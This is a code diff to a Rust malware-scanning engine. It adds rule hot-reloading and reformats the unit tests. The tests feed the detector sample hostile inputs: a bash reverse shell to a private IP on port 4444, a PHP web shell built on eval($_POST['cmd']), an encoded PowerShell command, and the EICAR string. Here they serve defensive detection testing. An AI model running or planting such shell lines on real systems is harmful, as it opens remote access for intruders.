@@ -72,7 +72,9 @@ impl YaraEngine {
                 tags: vec!["test".to_string()],
                 strings: vec![YaraString {
                     id: "$eicar".to_string(),
-                    pattern: b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*".to_vec(),
+                    pattern:
+                        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+                            .to_vec(),
                     is_nocase: false,
                 }],
                 meta_description: "EICAR standard antivirus test file".to_string(),
@@ -301,6 +303,27 @@ impl YaraEngine {
         self.rules.write().push(rule);
     }
 
+    /// Reload rules from the configured rules directory (hot-reload support).
+    /// Clears existing file-loaded rules and re-scans the directory.
+    /// Built-in rules are re-added first so they are never lost.
+    pub fn reload_rules(&self) {
+        if let Some(dir) = &self.rules_dir {
+            tracing::info!("YaraEngine: reloading rules from {:?}", dir);
+            let mut rules = self.rules.write();
+            rules.clear();
+            for rule in Self::builtin_rules() {
+                rules.push(rule);
+            }
+            drop(rules);
+            self.load_rules_from_dir(dir);
+        }
+    }
+
+    /// Return the configured rules directory path, if any.
+    pub fn rules_dir(&self) -> Option<&std::path::Path> {
+        self.rules_dir.as_deref()
+    }
+
     /// Load rules from .yar files in a directory.
     pub fn load_rules_from_dir(&self, dir: &Path) {
         let entries = match std::fs::read_dir(dir) {
@@ -387,8 +410,11 @@ impl YaraEngine {
 
             for yara_str in &rule.strings {
                 let found = if yara_str.is_nocase {
-                    let pattern_lower: Vec<u8> =
-                        yara_str.pattern.iter().map(|b| b.to_ascii_lowercase()).collect();
+                    let pattern_lower: Vec<u8> = yara_str
+                        .pattern
+                        .iter()
+                        .map(|b| b.to_ascii_lowercase())
+                        .collect();
                     contains_pattern(&data_lower, &pattern_lower)
                 } else {
                     contains_pattern(data, &yara_str.pattern)
@@ -517,11 +543,9 @@ mod tests {
         let text = b"This is a perfectly normal text document about cooking recipes.";
         let matches = engine.scan_data(text);
         // Should not match any dangerous rules (might match monero "4" in Crypto_Miner — that's by design for testing)
-        assert!(
-            !matches.iter().any(|(name, _)| name == "EICAR_test_file"
-                || name == "Linux_Reverse_Shell"
-                || name == "Web_Shell_Indicators"),
-        );
+        assert!(!matches.iter().any(|(name, _)| name == "EICAR_test_file"
+            || name == "Linux_Reverse_Shell"
+            || name == "Web_Shell_Indicators"),);
     }
 
     #[test]
@@ -529,9 +553,11 @@ mod tests {
         let engine = test_engine();
         let ps = b"powershell.exe -EncodedCommand ZABpAHIAIABDADoAXAA=";
         let matches = engine.scan_data(ps);
-        assert!(matches
-            .iter()
-            .any(|(name, _)| name == "Suspicious_PowerShell"));
+        assert!(
+            matches
+                .iter()
+                .any(|(name, _)| name == "Suspicious_PowerShell")
+        );
     }
 
     #[test]
@@ -539,9 +565,11 @@ mod tests {
         let engine = test_engine();
         let shell = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
         let matches = engine.scan_data(shell);
-        assert!(matches
-            .iter()
-            .any(|(name, _)| name == "Linux_Reverse_Shell"));
+        assert!(
+            matches
+                .iter()
+                .any(|(name, _)| name == "Linux_Reverse_Shell")
+        );
     }
 
     #[test]
@@ -549,9 +577,11 @@ mod tests {
         let engine = test_engine();
         let webshell = b"<?php eval($_POST['cmd']); ?>";
         let matches = engine.scan_data(webshell);
-        assert!(matches
-            .iter()
-            .any(|(name, _)| name == "Web_Shell_Indicators"));
+        assert!(
+            matches
+                .iter()
+                .any(|(name, _)| name == "Web_Shell_Indicators")
+        );
     }
 
     #[test]
@@ -602,7 +632,11 @@ mod tests {
         let dir = std::env::temp_dir().join("nexus-yara-test");
         let _ = std::fs::create_dir_all(&dir);
         let path = dir.join("shell.sh");
-        std::fs::write(&path, b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n").unwrap();
+        std::fs::write(
+            &path,
+            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
+        )
+        .unwrap();
 
         let engine = test_engine();
         let results = engine.scan_file(&path).await;
@@ -617,8 +651,10 @@ mod tests {
         // -encodedcommand in lowercase should still match Suspicious_PowerShell (nocase)
         let ps = b"powershell.exe -encodedcommand ZABpAHIAIABDADoAXAA=";
         let matches = engine.scan_data(ps);
-        assert!(matches
-            .iter()
-            .any(|(name, _)| name == "Suspicious_PowerShell"));
+        assert!(
+            matches
+                .iter()
+                .any(|(name, _)| name == "Suspicious_PowerShell")
+        );
     }
 }
